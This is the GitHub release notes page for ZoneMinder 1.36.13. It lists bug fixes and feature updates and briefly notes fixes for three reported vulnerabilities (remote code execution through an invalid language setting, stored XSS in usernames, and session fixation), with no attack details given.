[`db41e6e`](/ZoneMinder/zoneminder/commit/db41e6eda5e61349085445ae6678d775a272ec2b)

# Changes since 1.36.12

* Change a warning to a Debug when getting the latest image using zmu
* Updates to Axis PTZ script adding support for getting details from Path and fixing support for older cameras
* Fix for update script for 1.35.25 and DayEventDiskSpace
* include user and function error message about insufficient permissions. Will make it easier to figure out who tried what.
* Fix for crash in CSRF
* Fix missing text-right align on Port/Path labels. Set step to 1 for Port
* Remote RTSP camera.
* Fix fail to get Sources in Remote RTSP
* Fix compilation with ffmpeg 5.0
* Implement filter limits. Which go before pagination/advanced search limits
* Fix do\_debian\_package build script for version = CURRENT style versioning.
* Implement a check on change of language. Make sure that the specified language file exists. Reports errors to UI
* Test for valid language file when saving user.
* add styling for errors reported to ui and include the errors on options view
* Fix zmu device probing
* Change title of v4l settings button to give an indication WHY it isn't enabled
* Convert Fatal()s to Errors() in image viewing. Maybe Fixes [[#3426](https://github.com/ZoneMinder/zoneminder/issues/3426)]
* Include EndDateTimeShort in event stats
* Handle empty endtime (in progress event) more gracefully. If there is a next event just jump to it.
* locking fixes that caused hung zmu and zms processes
* Set mysql character set to utf8 explicitly to support chinese characters (or other special characters).
* escape html in Storage names
* fix auth'd user information being saved to session before switching session id's leaving bogus authenticated user in previous session.
* Fix potential XSS from Username
* Add a pattern filter for Usernames, Group Names and Storage Names to prevent invalid characters and XSS
* Add NOT IN case to filters. Also, fix bad SQL when value evals to false. Test for empty string instead. Fixes [[#3425](https://github.com/ZoneMinder/zoneminder/issues/3425)]
* Fix CURL monitors
* Fix event view corruption caused by changes to the sendfile system call.Fixes [[#3437](https://github.com/ZoneMinder/zoneminder/issues/3437)]
* Add useful title to frame image telling us which we are looking at
* Allow empty sort field when listing events
* Fix error in PTZ control code when no speed has been defined.
* Allow editing of admin user.
* Add more of the resulting SQL to the filter debug modal
* Make filter debug modal work on non-saved filter
* improvements to Event module implementing a Server() function which figures out which Server likely has the video. Use it to remove duplicate logic
* improvements to Zone module Add numCoords, Coords, Area, AlarmRGB to Zone object. Also add Points(), AreaCoords, svg\_polygon
* Implement zm\_setcookie to simplify setting cookies, set samesite, deal with older php etc
* add loading=lazy to most images to improve page loading
* Don't both running zmu if monitor Function is set to None
* Add mp4 as an option for generated video and make it the default instead of avi
* Set some new more sensible defaults for various settings including logging, navbar refreshes, full page refreshes and ajax timeouts
* Big update to Control.pm
* Fix for Netcat PTZ using x=0 y=0 for autostop in addition to old stop movement code
* Implement reboot and ping methods for Trendnet PTZ Control
* rough in Url, UrlToZMS PathToZMS PathToIndex, UrlToIndex UrlToApi PathToApi in SERver object
* reduce debug logging in zmaudit

There are fixes in here for 3 vulnerabilities:

Remote code execution by specifying an invalid language found by Krastanoel.

Stored XSS in Username field found by Tester Tester

Session Fixation problem found by Tester Tester.

**Full Changelog**: [1.36.12...1.36.13](https://github.com/ZoneMinder/zoneminder/compare/1.36.12...1.36.13)

 Assets
2

 Loading

 🎉
1
 PrplHaz4 reacted with hooray emoji

All reactions

* 🎉
  1 reaction

 1 person reacted

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


